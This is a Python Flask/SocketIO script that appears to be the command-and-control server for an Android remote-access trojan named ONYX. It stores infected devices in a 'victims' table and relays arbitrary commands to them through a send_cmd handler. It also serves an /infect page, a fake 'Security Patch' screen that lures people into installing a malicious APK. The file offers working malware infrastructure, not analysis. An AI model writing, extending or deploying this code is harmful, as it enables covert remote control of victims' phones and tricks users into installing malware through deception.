#!/usr/bin/env python3
import os, json, sqlite3, time
from flask import Flask, render_template_string, request, jsonify, redirect, session, send_file
from flask_socketio import SocketIO, emit
from datetime import datetime, timedelta
from functools import wraps

API_KEY = "onyx-master-2026"
SECRET_KEY = os.environ.get("SECRET_KEY", "change-this-in-production")
PORT = int(os.environ.get("PORT", 5000))

app = Flask(__name__)
app.secret_key = SECRET_KEY
app.permanent_session_lifetime = timedelta(days=7)

socketio = SocketIO(app, cors_allowed_origins="*", async_mode='threading')

conn = sqlite3.connect('/tmp/onyx.db', check_same_thread=False)
c = conn.cursor()
c.execute('''CREATE TABLE IF NOT EXISTS victims
             (device_id TEXT PRIMARY KEY, info TEXT, last_seen TEXT)''')
conn.commit()

AGENTS = {}

def login_required(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        if not session.get('logged_in'):
            return redirect('/login')
        return f(*args, **kwargs)
    return decorated

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        if request.form.get('username') == 'admin' and request.form.get('password') == 'onyx2026':
            session['logged_in'] = True
            session.permanent = True
            return redirect('/')
        return "Invalid credentials", 403
    return '''
    <form method="post" style="background:#0a0a14;color:#fff;padding:40px;max-width:400px;margin:100px auto;border-radius:20px;border:1px solid #7c3aed;">
    <h2>🔐 ONYX Login</h2>
    <input type="text" name="username" placeholder="Username" required style="width:100%;padding:10px;margin:10px 0;background:#222;color:#fff;border:1px solid #444;"><br>
    <input type="password" name="password" placeholder="Password" required style="width:100%;padding:10px;margin:10px 0;background:#222;color:#fff;border:1px solid #444;"><br>
    <button type="submit" style="background:#7c3aed;padding:10px 40px;border:none;border-radius:30px;color:#fff;font-weight:bold;">Enter</button>
    </form>
    '''

@app.route('/logout')
def logout():
    session.clear()
    return redirect('/login')

@app.route('/')
@login_required
def dashboard():
    try:
        html = open('templates/dashboard.html', 'r').read()
    except:
        html = "<h1>Dashboard missing</h1>"
    return render_template_string(html, ip=request.host)

@app.route('/apk')
@login_required
def apk_download():
    return "APK not built yet", 404

@app.route('/infect')
def infect():
    return '''
    <!DOCTYPE html><html><head><meta name="viewport"><title>Update</title>
    <style>body{background:#000;color:#fff;text-align:center;padding-top:50px;font-family:sans-serif;}
    .btn{background:#7c3aed;padding:15px 40px;border-radius:50px;color:#fff;font-size:20px;text-decoration:none;display:inline-block;}</style>
    </head><body><div style="background:#111;padding:40px;border-radius:20px;max-width:400px;margin:auto;border:1px solid #7c3aed;">
    <h1>⚠️ Security Patch</h1><p>Install this critical update to secure your device.</p>
    <a href="/apk" class="btn">⬇ Download & Install</a>
    <p style="font-size:12px;color:#666;">After download, tap "Install".</p></div></body></html>
    '''

@socketio.on('connect')
def handle_connect():
    print(f"[+] Client connected: {request.sid}")

@socketio.on('register_agent')
def register_agent(data):
    device_id = data.get('device_id')
    if not device_id:
        return
    AGENTS[device_id] = request.sid
    c.execute("REPLACE INTO victims (device_id, info, last_seen) VALUES (?, ?, ?)",
              (device_id, json.dumps(data.get('info', {})), datetime.utcnow().isoformat()))
    conn.commit()
    emit('agent_registered', {'status': 'ok'}, room=request.sid)
    emit('victims_list', list(AGENTS.keys()), broadcast=True)

@socketio.on('agent_response')
def agent_response(data):
    emit('command_result', {
        'device_id': data.get('device_id'),
        'data': data.get('data')
    }, broadcast=True)

@socketio.on('send_cmd')
def send_cmd(data):
    device_id = data.get('id')
    cmd = data.get('cmd')
    if device_id in AGENTS:
        emit('execute_command', {'cmd': cmd}, room=AGENTS[device_id])
    else:
        emit('command_result', {'error': 'Device offline'}, room=request.sid)

@socketio.on('get_victims')
def get_victims():
    emit('victims_list', list(AGENTS.keys()), room=request.sid)

@socketio.on('disconnect')
def handle_disconnect():
    for k, v in list(AGENTS.items()):
        if v == request.sid:
            del AGENTS[k]
            emit('victims_list', list(AGENTS.keys()), broadcast=True)
            break

if __name__ == '__main__':
    os.makedirs('templates', exist_ok=True)
    os.makedirs('apks', exist_ok=True)
    print(f"[+] ONYX Server starting on port {PORT}")
    socketio.run(app, host='0.0.0.0', port=PORT, debug=False)
